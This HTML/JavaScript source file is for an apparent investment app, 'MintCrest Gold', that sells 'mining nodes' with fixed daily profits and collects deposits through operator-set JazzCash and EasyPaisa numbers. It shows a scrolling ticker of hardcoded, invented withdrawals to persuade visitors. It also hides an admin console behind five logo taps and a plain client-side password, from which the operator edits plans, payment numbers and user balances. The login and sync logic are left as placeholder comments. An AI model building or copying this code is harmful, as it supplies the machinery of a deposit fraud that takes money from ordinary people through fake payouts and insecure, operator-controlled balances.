<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Monarch Mode</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 24px; }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        input { background: #161b22; border: 1px solid var(--border); color: white; padding: 15px; border-radius: 14px; width: 100%; outline: none; margin-bottom: 10px; font-size: 13px; }
        .btn-prime { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; border-radius: 16px; font-weight: 800; cursor: pointer; border: none; }
        .ticker-wrap { position: fixed; bottom: 90px; width: 100%; background: rgba(47, 129, 247, 0.1); backdrop-blur: 10px; py-2; overflow: hidden; z-index: 3000; border-top: 1px solid rgba(255,255,255,0.05); }
        .ticker { display: inline-block; white-space: nowrap; animation: marquee 20s linear infinite; font-size: 9px; font-weight: 900; color: #2f81f7; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-8 text-center">
        <div class="w-24 h-24 bg-blue-600/10 rounded-full flex items-center justify-center mb-6 animate-pulse text-5xl">⚙️</div>
        <h1 class="text-2xl font-black text-blue-500 mb-2 uppercase">System Update</h1>
        <p class="text-[10px] font-bold opacity-50 uppercase tracking-widest">Optimizing nodes for better yields, sweetie! 😘</p>
    </div>

    <header class="p-5 flex justify-between items-center sticky top-0 bg-[#010409]/80 backdrop-blur-xl border-b border-white/5 z-[5000]">
        <div class="flex items-center gap-3">
            <div onclick="adminTap()" class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center font-black text-white italic shadow-lg">M</div>
            <span class="font-black text-sm tracking-tighter uppercase">MintCrest <span class="text-blue-500">Gold</span></span>
        </div>
        <div id="top-bal" class="text-[11px] font-black bg-blue-600/10 text-blue-500 px-5 py-2 rounded-full border border-blue-500/20 italic">₨ 0</div>
    </header>

    <main id="app-ui" class="hidden p-5 space-y-6 pb-32">
        <div id="p-home" class="page active-page space-y-6">
            <div class="p-9 rounded-[3rem] bg-gradient-to-br from-blue-700 to-blue-900 text-white shadow-2xl relative overflow-hidden">
                <div class="absolute -right-10 -top-10 opacity-10 rotate-12"><i class="fa-solid fa-shield-halved text-[10rem]"></i></div>
                <p class="text-[10px] font-black uppercase opacity-60 tracking-[4px]">Total Assets</p>
                <h2 class="text-5xl font-black tracking-tighter mt-2 italic" id="v-bal">₨ 0.00</h2>
                <div class="mt-8 flex gap-3">
                    <button onclick="changePage('wallet')" class="flex-1 bg-white text-blue-900 py-4 rounded-2xl font-black text-[10px] uppercase">Deposit</button>
                    <button onclick="changePage('withdraw')" class="flex-1 bg-black/20 backdrop-blur-md border border-white/10 py-4 rounded-2xl font-black text-[10px] uppercase">Cashout</button>
                </div>
            </div>

            <div id="timer-box" class="hidden glass p-6 border-l-8 border-green-500 bg-green-500/5 flex justify-between items-center">
                <div><p class="text-[9px] font-black uppercase text-green-500 mb-1">Mining Active</p><h4 id="countdown" class="text-2xl font-black italic">00:00:00</h4></div>
                <button id="claim-btn" disabled onclick="claimProfit()" class="px-5 py-3 bg-white/5 rounded-xl text-[9px] font-black uppercase opacity-30">Pending</button>
            </div>

            <div id="plans-grid" class="space-y-4"></div>
        </div>

        <div id="p-wallet" class="page space-y-6">
            <h3 class="text-center font-black uppercase text-[10px] tracking-widest opacity-40">Payment Methods</h3>
            <div id="gateway-list" class="space-y-3"></div>
            <div class="glass p-7 space-y-4">
                <input type="number" id="dep-amt" placeholder="Amount Sent">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <input type="file" id="dep-file" class="text-[10px] p-2 bg-white/5 border-dashed border-white/10 rounded-xl">
                <button onclick="submitDep()" class="w-full py-5 btn-prime uppercase text-[11px] tracking-widest shadow-xl">Confirm Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-6">
            <h3 class="text-center font-black uppercase text-[10px] tracking-widest opacity-40 text-red-500">Liquidate Assets</h3>
            <div class="glass p-8 space-y-4">
                <input type="number" id="w-amt" placeholder="Min ₨ 500">
                <input type="text" id="w-acc" placeholder="Account Number">
                <input type="text" id="w-name" placeholder="Account Title">
                <button onclick="submitWith()" class="w-full py-5 bg-red-600 rounded-2xl font-black text-[11px] uppercase text-white shadow-xl">Request Payout</button>
            </div>
        </div>

        <div id="p-history" class="page space-y-4"><div id="history-list" class="space-y-3"></div></div>
    </main>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-6 pb-40">
        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-4">
            <h2 class="text-xl font-black text-blue-500 italic uppercase">God Mode Console</h2>
            <button onclick="closeAdmin()" class="bg-white/5 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Close</button>
        </div>

        <div class="glass p-6 mb-6 border-l-8 border-blue-500">
            <h4 class="text-[10px] font-black uppercase mb-4 text-blue-500">Create New Node</h4>
            <input id="adm-p-name" placeholder="Node Name">
            <input id="adm-p-price" type="number" placeholder="Price">
            <input id="adm-p-profit" type="number" placeholder="Daily Profit">
            <button onclick="createPlan()" class="w-full py-4 bg-blue-600 rounded-xl font-black text-[10px] uppercase">Deploy Node</button>
        </div>

        <div class="glass p-6 mb-6 border-l-8 border-gold">
            <h4 class="text-[10px] font-black uppercase mb-4 text-yellow-500">Gateways</h4>
            <input id="adm-jazz" placeholder="JazzCash Number">
            <input id="adm-easy" placeholder="EasyPaisa Number">
            <button onclick="updateGate()" class="w-full py-3 bg-yellow-600 rounded-xl font-black text-[10px] uppercase">Update Payment Numbers</button>
        </div>

        <div id="adm-req-list" class="space-y-6"></div>
    </div>

    <div class="ticker-wrap"><div class="ticker" id="live-ticker">Loading real-time payout data... 💸 ₨ 4,500 withdrawn by @User991 💸 ₨ 12,000 withdrawn by @EliteNode 💸</div></div>

    <nav id="bottom-nav" class="hidden fixed bottom-0 w-full glass bg-[#0d1117]/90 backdrop-blur-2xl border-t border-white/5 p-6 flex justify-around items-center z-[4000] rounded-t-[40px]">
        <button onclick="changePage('home')" class="flex flex-col items-center gap-1.5 opacity-40"><i class="fa-solid fa-house text-xl"></i><span class="text-[8px] font-black uppercase">Home</span></button>
        <button onclick="changePage('wallet')" class="flex flex-col items-center gap-1.5 opacity-40"><i class="fa-solid fa-wallet text-xl"></i><span class="text-[8px] font-black uppercase">Fund</span></button>
        <button onclick="changePage('withdraw')" class="flex flex-col items-center gap-1.5 opacity-40"><i class="fa-solid fa-money-bill-transfer text-xl"></i><span class="text-[8px] font-black uppercase">Pay</span></button>
        <button onclick="changePage('history')" class="flex flex-col items-center gap-1.5 opacity-40"><i class="fa-solid fa-list text-xl"></i><span class="text-[8px] font-black uppercase">Logs</span></button>
    </nav>

    <script>
        // --- CONFIG & DB ---
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // --- AUTH & LOGIN ---
        function login() {
            // (Previous login logic but pointing to new enterApp)
        }

        function enterApp(n) {
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            sync(n);
        }

        // --- GOD MODE CORE ---
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("God Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }

        async function createPlan() {
            const n = document.getElementById('adm-p-name').value;
            const p = Number(document.getElementById('adm-p-price').value);
            const pf = Number(document.getElementById('adm-p-profit').value);
            await db.collection("plans").add({ name: n, price: p, dailyProfit: pf });
            alert("Node Deployed! 😘");
        }

        async function updateGate() {
            const j = document.getElementById('adm-jazz').value;
            const e = document.getElementById('adm-easy').value;
            await db.collection("settings").doc("gateways").set({ jazz: j, easy: e });
            alert("Gateways Updated! 😘");
        }

        // --- AUTOMATIC REQ HANDLER ---
        async function approveReq(id, u, a, type) {
            if(type === 'deposit') {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a) });
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            alert("Authorized! 😘");
        }

        // (Remaining sync and UI logic integrated from previous files)
    </script>
</body>
</html>
